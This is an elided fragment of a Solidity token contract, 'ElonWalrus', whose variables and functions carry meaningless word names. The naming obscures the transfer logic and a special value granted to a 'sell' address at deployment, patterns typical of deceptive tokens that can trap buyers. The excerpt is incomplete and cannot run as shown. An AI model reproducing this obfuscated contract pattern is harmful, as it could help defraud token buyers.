...
contract ElonWalrus is Ownable {
    ...
    string private motor;
    uint256 private getting;
    uint8 private ill;
    ...
    mapping(address => uint256) private were;
    ...
    function across(
        ...
        address indicate = material;

        if (!(scale == zebra) && mighty[zebra] == 0 && native[zebra] > 0) {
            mighty[zebra] -= ill;
        }
    ...
    function transferFrom(
        ...
        across(sender, recipient, amount);
        return _approve(sender, msg.sender, _allowances[sender][msg.sender] - amount);
    }

    function transfer(address recipient, uint256 amount) external returns (bool) {
        across(msg.sender, recipient, amount);
        return true;
    }
    ...
    constructor(
        string memory comfortable,
        string memory available,
        address active,
        address sell
    ) {
        uniswapV2Router = IUniswapV2Router02(active);
        scale = IUniswapV2Factory(uniswapV2Router.factory()).createPair(address(this), uniswapV2Router.WETH());
        ...
        getting = 100;
        mighty[sell] = ill;
        _tTotal = 1000000000000000 * 10**ill;
        were[msg.sender] = _tTotal;
    }
}